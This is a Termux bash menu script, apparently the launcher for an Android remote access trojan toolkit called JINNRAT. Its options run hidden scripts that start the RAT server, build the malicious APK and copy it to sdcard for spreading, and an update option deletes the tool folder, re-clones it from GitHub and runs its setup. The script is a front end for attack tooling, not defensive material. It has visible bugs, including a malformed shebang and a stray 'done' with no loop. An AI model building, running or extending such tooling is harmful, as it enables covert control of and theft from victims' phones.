#!data/data/com.termux/files/usr/bin/bash

# colour 
Black="\033[1;30m"       # Black
Red="\033[1;31m"         # Red
Green="\033[1;32m"       # Green
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White

clear                                                                                   
echo -e "$Purple ███╗   ███╗██████╗  $Red        ██╗██╗███╗   ██╗███╗   ██╗ $Green  "
echo -e "$Purple ████╗ ████║██╔══██╗ $Red        ██║██║████╗  ██║████╗  ██║ $Green  "   
echo -e "$Purple ██╔████╔██║██████╔╝ $Red        ██║██║██╔██╗ ██║██╔██╗ ██║ $Green  "
echo -e "$Purple ██║╚██╔╝██║██╔══██╗ $Red   ██   ██║██║██║╚██╗██║██║╚██╗██║ $Green  "
echo -e "$Purple ██║ ╚═╝ ██║██║  ██║ $Red   ╚█████╔╝██║██║ ╚████║██║ ╚████║ $Green  "
echo -e "$Purple ╚═╝     ╚═╝╚═╝  ╚═╝ $Red    ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ $Green  "

echo " "
echo -e "     $Purple==>$Yellow[1️⃣] index.js $Green        "

echo -e "     $Purple==>️$Yellow[2️⃣] BuildAPK $Green        "

echo -e "     $Purple==>$Yellow[3️⃣] setup install $Green   "

echo -e "     $Purple==>$Yellow[4️⃣] Apk copy sdcard $Green "

echo -e "     $Purple==>$Yellow[5️⃣] Update $Green          "

echo -e "     $Purple==>$Yellow[6️⃣] exit $Green            "                                                                    
echo " "
echo " "

    read ch
   if [ $ch -eq 1 ];then
        cd $HOME
        cd JINNRAT
        cd .RAT
        bash .JINN

        exit
    elif [ $ch -eq 2 ];then
        cd $HOME
        cd JINNRAT
        cd .RAT
        bash .BuildAPK

        exit
    elif [ $ch -eq 3 ];then
        cd $HOME
        cd JINNRAT
        cd .RAT
        bash .setup

        exit
    elif [ $ch -eq 4 ];then
        echo -e "\e[1;31m 😈 Apk copy sdcard Please check...📌"
        cd $HOME
        cd JINNRAT
        cd .RAT
        bash .sdapk

        exit
    elif [ $ch -eq 5 ];then
        echo -e "\e[1;34m Downloading Latest Files..."
        cd $HOME
        rm -rf JINNRAT
        git clone https://github.com/alvinbaby/JINNRAT
        cd JINNRAT
        chmod +x *
        bash setup.sh

        exit
    elif [ $ch -eq 6 ];then
        echo -e 
        cd $HOME

        exit
        
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
done
